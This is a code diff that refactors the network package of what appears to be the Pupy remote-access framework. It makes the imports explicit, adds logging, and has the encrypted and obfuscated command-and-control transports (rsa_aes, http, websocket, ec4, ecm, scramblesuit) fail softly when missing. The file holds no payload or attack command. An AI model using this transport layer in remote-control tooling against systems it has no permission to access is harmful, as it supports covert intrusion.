@@ -1,25 +1,62 @@
 import logging
-from .streams import *
+
+logger = logging.getLogger('pupy.network')
+def getLogger(name):
+    return logger.getChild(name)
+
+from .streams.PupySocketStream import PupySocketStream
+
+try:
+    from .streams.PupySocketStream import PupyUDPSocketStream
+except:
+    PupyUDPSocketStream = None
+
 from .base import chain_transports
 from .servers import PupyTCPServer, PupyUDPServer
-from .clients import PupyTCPClient, PupySSLClient, PupyProxifiedTCPClient, PupyProxifiedSSLClient, PupyAsyncClient, PupyUDPClient
+from .clients import PupyTCPClient, PupySSLClient
+from .clients import PupyProxifiedTCPClient, PupyProxifiedSSLClient
+from .clients import PupyUDPClient
+
 from .transports.dummy import DummyPupyTransport
-from .transports.dummy_packets import DummyPupyPacketsTransport
-from .transports.b64 import B64Client, B64Server, B64Transport
-from .transports.http import PupyHTTPClient, PupyHTTPServer
-from .transports.websocket import PupyWebSocketClient, PupyWebSocketServer
-from .transports.xor import XOR
-from .transports.aes import AES256, AES128
-from .transports.rsa_aes import RSA_AESClient, RSA_AESServer
+
+try:
+    from .transports.rsa_aes import RSA_AESClient, RSA_AESServer
+except Exception, e:
+    logger.exception('Transport rsa_aes disabled: {}'.format(e))
+    RSA_AESClient = None
+    RSA_AESServer = None
+
+try:
+    from .transports.http import PupyHTTPClient, PupyHTTPServer
+except Exception, e:
+    logger.exception('Transport http disabled: {}'.format(e))
+    PupyHTTPClient = None
+    PupyHTTPServer = None
+
+try:
+    from .transports.websocket import PupyWebSocketClient, PupyWebSocketServer
+except Exception, e:
+    logger.exception('Transport websocket disabled: {}'.format(e))
+    PupyWebSocketClient = None
+    PupyWebSocketServer = None
+
 try:
     from .transports.ec4 import EC4TransportServer, EC4TransportClient
 except Exception as e:
-    logging.warning("%s : Transport ec4 disabled"%str(e))
-    EC4TransportServer=None
-    EC4TransportClient=None
+    logger.exception('Transport ec4 disabled: {}'.format(e))
+    EC4TransportServer = None
+    EC4TransportClient = None
+
+try:
+    from .transports.ecm import ECMTransportServer, ECMTransportClient
+except Exception as e:
+    logger.exception('Transport ecm disabled: {}'.format(e))
+    ECMTransportServer = None
+    ECMTransportClient = None
+
 try:
     from .transports.scramblesuit.scramblesuit import ScrambleSuitClient, ScrambleSuitServer
 except Exception as e:
-    logging.warning("%s : Transport scramblesuit disabled"%str(e))
-    ScrambleSuitClient=None
-    ScrambleSuitServer=None
+    logger.exception('Transport scramblesuit disabled: {}'.format(e))
+    ScrambleSuitClient = None
+    ScrambleSuitServer = None
